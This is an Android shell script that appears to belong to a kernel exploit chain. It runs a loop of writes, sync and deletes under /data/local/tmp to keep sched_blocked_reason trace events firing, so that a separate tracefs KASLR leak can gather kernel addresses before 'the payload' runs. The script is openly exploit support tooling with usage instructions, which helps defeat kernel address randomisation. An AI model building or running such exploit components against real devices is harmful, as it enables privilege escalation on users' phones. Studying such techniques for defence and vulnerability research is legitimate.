#!/system/bin/sh
# Fire sched_blocked_reason events in a loop so the tracefs KASLR leak has a
# worker_thread caller to read. Run in the background before the payload:
#
#   sh kick-blocked-reason.sh &  BGPID=$!
#   ... run payload ...
#   kill $BGPID
#
# sched_blocked_reason fires in try_to_wake_up() when the woken task was
# TASK_UNINTERRUPTIBLE -- which a kworker freshly woken to run a work item is.
# The cheapest way to keep a stream of those going from a shell is bursty
# writes followed by sync(2): every sync wakes the writeback kworkers out of
# their mutex wait. On an idle device the natural rate is too low for the
# leak's 1 s collection window, hence this loop.
i=0
while [ "$i" -lt 400 ]; do
  i=$((i + 1))
  head -c 200000 /dev/urandom > "/data/local/tmp/asteroids/.kick$i" 2>/dev/null
  sync
  rm -f "/data/local/tmp/asteroids/.kick$i"
done
